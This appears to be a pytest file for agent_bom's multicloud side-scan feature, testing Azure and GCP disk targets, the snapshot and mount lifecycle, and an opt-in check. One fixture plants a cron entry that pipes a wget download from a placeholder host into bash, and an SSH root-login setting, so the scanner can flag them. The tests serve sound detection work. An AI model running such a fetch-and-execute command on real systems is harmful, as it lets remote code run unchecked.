from __future__ import annotations

from pathlib import Path

import pytest

from agent_bom.cloud.side_scan import SideScanDisabledError
from agent_bom.cloud.side_scan_targets import (
    CloudSideScanTarget,
    azure_managed_disk_targets,
    gcp_persistent_disk_targets,
    run_cloud_side_scan_targets,
)


class FakeLifecycle:
    def __init__(self) -> None:
        self.calls: list[tuple[str, str]] = []

    def create_snapshot(self, target: CloudSideScanTarget) -> str:
        self.calls.append(("create_snapshot", target.target_id))
        return f"snap-{target.name}"

    def create_scan_disk(self, target: CloudSideScanTarget, snapshot_id: str) -> str:
        self.calls.append(("create_scan_disk", snapshot_id))
        return f"scan-disk-{target.name}"

    def attach_scan_disk(self, target: CloudSideScanTarget, scan_disk_id: str, collector_id: str) -> str:
        self.calls.append(("attach_scan_disk", f"{scan_disk_id}:{collector_id}"))
        return "/dev/sdz"

    def detach_scan_disk(self, target: CloudSideScanTarget, scan_disk_id: str, collector_id: str) -> None:
        self.calls.append(("detach_scan_disk", f"{scan_disk_id}:{collector_id}"))

    def delete_scan_disk(self, target: CloudSideScanTarget, scan_disk_id: str) -> None:
        self.calls.append(("delete_scan_disk", scan_disk_id))

    def delete_snapshot(self, target: CloudSideScanTarget, snapshot_id: str) -> None:
        self.calls.append(("delete_snapshot", snapshot_id))


class FakeMount:
    def __init__(self, mount_dir: Path) -> None:
        self.mount_dir = mount_dir
        self.attached: list[tuple[str, str]] = []
        self.unmounted: list[Path] = []

    def attach_and_mount(self, volume_id: str, device: str) -> Path:
        self.attached.append((volume_id, device))
        return self.mount_dir

    def unmount(self, mount_point: Path) -> None:
        self.unmounted.append(mount_point)


@pytest.fixture()
def mounted_linux_disk(tmp_path: Path) -> Path:
    root = tmp_path / "mnt"
    (root / "etc" / "ssh").mkdir(parents=True)
    (root / "etc" / "ssh" / "sshd_config").write_text("PermitRootLogin yes\n")
    (root / "etc" / "cron.d").mkdir(parents=True)
    (root / "etc" / "cron.d" / "bootstrap").write_text("wget https://example.invalid/x | bash\n")
    return root


def test_azure_managed_disk_targets_are_metadata_only_and_eligible() -> None:
    targets = azure_managed_disk_targets(
        [
            {
                "id": "/subscriptions/sub-1/resourceGroups/rg/providers/Microsoft.Compute/disks/os-disk",
                "name": "os-disk",
                "location": "eastus",
                "disk_size_gb": 128,
                "encryption_type": "EncryptionAtRestWithCustomerKey",
            }
        ],
        subscription_id="sub-1",
    )

    assert targets == [
        {
            "provider": "azure",
            "target_type": "managed_disk",
            "target_id": "/subscriptions/sub-1/resourceGroups/rg/providers/Microsoft.Compute/disks/os-disk",
            "name": "os-disk",
            "account_id": "sub-1",
            "location": "eastus",
            "size_gb": 128,
            "encryption": "EncryptionAtRestWithCustomerKey",
            "status": "eligible",
            "execution": "not_started",
            "requires_snapshot_role": True,
        }
    ]


def test_gcp_persistent_disk_targets_are_metadata_only_and_eligible() -> None:
    targets = gcp_persistent_disk_targets(
        [
            {
                "id": "1234567890",
                "name": "web-disk",
                "location": "us-central1-a",
                "size_gb": 50,
                "encrypted": True,
            }
        ],
        project_id="proj-1",
    )

    assert targets == [
        {
            "provider": "gcp",
            "target_type": "persistent_disk",
            "target_id": "1234567890",
            "name": "web-disk",
            "account_id": "proj-1",
            "location": "us-central1-a",
            "size_gb": 50,
            "encryption": "customer-managed",
            "status": "eligible",
            "execution": "not_started",
            "requires_snapshot_role": True,
        }
    ]


@pytest.mark.asyncio
async def test_multicloud_side_scan_executes_snapshot_mount_parse_cleanup(
    monkeypatch: pytest.MonkeyPatch, mounted_linux_disk: Path
) -> None:
    monkeypatch.setenv("AGENT_BOM_SIDESCAN", "1")

    async def _no_cves(_packages):
        return 0

    monkeypatch.setattr("agent_bom.cloud.side_scan_targets._scan_packages", _no_cves)
    lifecycle = FakeLifecycle()
    mount = FakeMount(mounted_linux_disk)

    results = await run_cloud_side_scan_targets(
        [
            {
                "provider": "azure",
                "target_type": "managed_disk",
                "target_id": "/subscriptions/sub-1/resourceGroups/rg/providers/Microsoft.Compute/disks/os-disk",
                "name": "os-disk",
                "account_id": "sub-1",
                "location": "eastus",
                "size_gb": 128,
                "encryption": "provider-managed",
            }
        ],
        lifecycles={"azure": lifecycle},
        collector_ids={"azure": "vm-collector"},
        mount_controller=mount,
    )

    assert len(results) == 1
    result = results[0]
    assert result.cleaned_up is True
    assert result.snapshot_id == "snap-os-disk"
    assert result.scan_disk_id == "scan-disk-os-disk"
    assert [call[0] for call in lifecycle.calls] == [
        "create_snapshot",
        "create_scan_disk",
        "attach_scan_disk",
        "detach_scan_disk",
        "delete_scan_disk",
        "delete_snapshot",
    ]
    assert mount.attached == [("scan-disk-os-disk", "/dev/sdz")]
    assert mount.unmounted == [mounted_linux_disk]
    assert [finding.finding_type for finding in result.config_findings] == ["ssh_root_login_enabled"]
    assert [finding.finding_type for finding in result.ioc_findings] == ["download_execute_startup"]
    assert "example.invalid" not in str(result.to_dict()["ioc_findings"])


@pytest.mark.asyncio
async def test_multicloud_side_scan_requires_explicit_opt_in(monkeypatch: pytest.MonkeyPatch, mounted_linux_disk: Path) -> None:
    monkeypatch.delenv("AGENT_BOM_SIDESCAN", raising=False)

    with pytest.raises(SideScanDisabledError, match="AGENT_BOM_SIDESCAN"):
        await run_cloud_side_scan_targets(
            [
                {
                    "provider": "gcp",
                    "target_type": "persistent_disk",
                    "target_id": "disk-1",
                    "name": "disk-1",
                    "account_id": "project-1",
                    "location": "us-central1-a",
                }
            ],
            lifecycles={"gcp": FakeLifecycle()},
            collector_ids={"gcp": "collector"},
            mount_controller=FakeMount(mounted_linux_disk),
        )
